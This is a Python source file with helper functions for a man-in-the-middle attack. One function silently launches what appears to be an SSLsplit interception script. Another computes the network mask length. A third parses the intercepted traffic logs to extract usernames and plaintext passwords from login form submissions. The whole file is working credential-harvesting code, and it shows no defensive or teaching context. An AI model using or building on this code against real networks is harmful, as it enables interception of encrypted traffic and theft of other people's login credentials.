def getMask1Bits():
    import subprocess
    netMask = (subprocess.check_output(["sh", "MITM/getMask.sh"])).decode("utf-8")
    digits = netMask[0:len(netMask)-1].split(".")

    table = [0, 1, 3, 7, 15, 31, 63, 127, 255]
    answer = 0
    for value in digits:
        for i in range(len(table)):
            if int(value) == table[i]:
                answer = answer + i
                break
    return answer

def fetchPasswd():
    import subprocess, os
    result = []

    filenames = os.listdir("MITM/logdir")
    for filename in filenames:
        with open("MITM/logdir/" + filename, "r", encoding = "utf-8", errors = "ignore") as fp:
            lines = fp.readlines()
            for content in lines:
                if content[0:10] == "logintoken":
                    usernameIndex = content.find("&username")
                    passwordIndex = content.find("&password")
                    tokenIndex = content.find("&token")
                    result.append({"username": content[usernameIndex + 10:passwordIndex], "password": content[passwordIndex + 10:tokenIndex]})
    return result

def runSSLSplit():
    import subprocess, os
    pid = subprocess.Popen(["sh", "MITM/mySSLsplit.sh"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return pid
